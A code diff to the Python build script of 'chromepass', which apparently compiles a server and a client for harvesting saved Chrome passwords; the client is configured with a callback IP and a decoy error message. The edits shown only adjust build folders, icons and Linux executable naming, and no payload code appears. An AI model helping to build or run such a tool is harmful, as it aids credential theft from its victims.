@@ -21,7 +21,6 @@ config = configparser.ConfigParser()
 config.read("config.ini")
 
 template_dir = config["DIRECTORIES"]["TemplateDir"]
-build_dir = config["DIRECTORIES"]["BuildDir"]
 dist_dir = config["DIRECTORIES"]["DistDir"]
 icon_dir = config["DIRECTORIES"]["IconDir"]
 chromepass_base = config["DIRECTORIES"]["ChromePassBase"]
@@ -43,8 +42,6 @@ def rmtree(top):
 
 
 def reset_folders():
-    if os.path.exists(build_dir):
-        rmtree(build_dir)
     if not os.path.exists(dist_dir):
         os.mkdir(dist_dir)
 
@@ -119,12 +116,15 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
         executable_name = "release/chromepass-server.exe"
     if os.path.exists(temp_path) and not nobuild:
         print("[+] Building Server")
+        icon_path = f"{template_dir}/{chromepass_server}/server.ico"
         if not linux:
             shutil.copyfile(f"{icon_dir}/{icon}",
                             f"{template_dir}/{chromepass_server}/server.ico")
+        elif os.path.exists(icon_path):
+            os.remove(icon_path)
         if compile_client(build_command):
             shutil.copyfile(
-                f"{template_dir}/{chromepass_server}/target/{executable_name}", f"{dist_dir}/{filename}.exe")
+                f"{template_dir}/{chromepass_server}/target/{executable_name}", f"{dist_dir}/{filename}" + (".exe" if not linux else ""))
             os.remove(
                 f"{template_dir}/{chromepass_server}/target/{executable_name}")
             print("[+] Server build successful")
@@ -188,7 +188,6 @@ def parse_arguments():
         return False
 
     reset_folders()
-    os.mkdir(build_dir)
     server = build_server(
         port=args.port, nobuild=args.noserver, linux=args.linux)
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
